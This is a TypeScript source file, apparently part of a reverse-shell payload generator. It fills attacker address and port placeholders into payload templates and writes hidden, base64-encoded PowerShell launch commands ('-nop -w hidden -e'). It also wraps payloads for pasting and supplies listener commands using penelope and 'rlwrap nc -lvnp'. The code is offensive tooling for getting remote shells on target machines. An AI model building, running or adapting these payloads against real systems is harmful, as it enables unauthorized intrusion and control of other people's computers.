import { utf16leBase64 } from "./encode";
import { wrapForContext, type PasteContext } from "./context";
import type { BuiltPayload, PayloadDef } from "./types";

const PLACEHOLDER = /\{([A-Z][A-Z0-9_]*)\}/g;
const FALLBACK_LISTENER = "rlwrap nc -lvnp";

/** Fills the placeholders and wraps the result so it works as pasted in `ctx`. */
export function buildPayload(def: PayloadDef, ctx: PasteContext, values: Record<string, string>): BuiltPayload {
  const unresolved: string[] = [];
  const value = (name: string): string | null => {
    const given = (values[name] ?? "").trim();
    const v = given !== "" ? given : (def.defaults?.[name] ?? "").trim();
    return v === "" ? null : v;
  };
  const filled = def.template.replace(PLACEHOLDER, (m, name: string) => {
    const v = value(name);
    if (v === null) {
      if (!unresolved.includes(name)) unresolved.push(name);
      return m;
    }
    return v;
  });

  const notes: string[] = [...(def.notes ?? [])];
  let text: string;
  if (unresolved.length > 0) {
    // Keep the placeholder visible; encoding or wrapping it would hide the gap.
    text = def.encodePowerShell
      ? `powershell -nop -w hidden -e <UTF-16LE base64 of the script, once ${unresolved.map((n) => `{${n}}`).join(" ")} is set>`
      : filled;
    notes.push(`Set ${unresolved.join(", ")} first: the payload is not wrapped for ${ctx} until it is.`);
  } else {
    const raw = def.encodePowerShell ? `powershell -nop -w hidden -e ${utf16leBase64(filled)}` : filled;
    const wrapped = wrapForContext(raw, ctx, def.os);
    text = wrapped.text;
    notes.push(...wrapped.notes);
  }
  if (def.bakesIp) notes.push("LHOST and LPORT are baked into the served script: regenerate it if either changes.");
  if (def.serve) notes.push(`Serve it first: ${def.serve}`);

  const port = value("LPORT") ?? "{LPORT}";
  let listener: string | null = null;
  if (def.listener === "penelope") {
    listener = `penelope -O -p ${port}`;
    notes.push(`No penelope? ${FALLBACK_LISTENER} ${port}`);
  }
  return { def, text, listener, parts: def.parts, notes, unresolved };
}
